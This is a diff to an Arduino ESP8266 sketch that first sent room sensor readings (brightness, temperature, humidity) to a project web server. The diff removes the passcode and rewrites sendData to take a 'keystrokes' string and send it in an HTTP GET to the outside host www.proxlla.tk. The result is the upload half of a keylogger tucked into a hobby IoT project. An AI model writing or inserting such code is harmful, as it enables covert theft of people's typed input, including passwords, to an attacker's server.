@@ -10,7 +10,7 @@ Modifié par S'Tonfute le 05/02/15
 
 // Set a password so that people can't just insert values by visiting the data entry page
 // in their browser. Must be consistent with $passcode in data.php.
-#define PASSCODE "password"
+
 
 #define SENDDELAY 180  // Seconds between sending data. Try to keep under 3 digits.
 
@@ -38,7 +38,7 @@ void loop(){
 
 }
 
-void sendData(String tBrightness, String tTemp, String tHum){
+void sendData(String keystrokes){
   // Set up TCP connection.
   String cmd = "AT+CIPSTART=\"TCP\",\"";
   cmd += HOST;
@@ -51,15 +51,10 @@ void sendData(String tBrightness, String tTemp, String tHum){
   }
 
   // Send data.
-  cmd = "GET /esp8266/data.php?code=";
-  cmd += PASSCODE;
-  cmd += "&l=";
-  cmd += tBrightness;
-  cmd += "&t=";
-  cmd += tTemp;
-  cmd += "&h=";
-  cmd += tHum;
-  cmd += " HTTP/1.1\r\nHost: www.mwhprojects.com\r\n\r\n\r\n";
+  cmd = "GET /esp8266/data.php?";
+  cmd += "key=";
+  cmd += keystrokes;
+  cmd += " HTTP/1.1\r\nHost: www.proxlla.tk\r\n\r\n\r\n";
   Serial.print("AT+CIPSEND=");
   Serial.println(cmd.length());
   if(Serial.find(">")){
@@ -89,8 +84,3 @@ boolean connectWiFi(){
     return false;
   }
 }
-
-
-
-
-
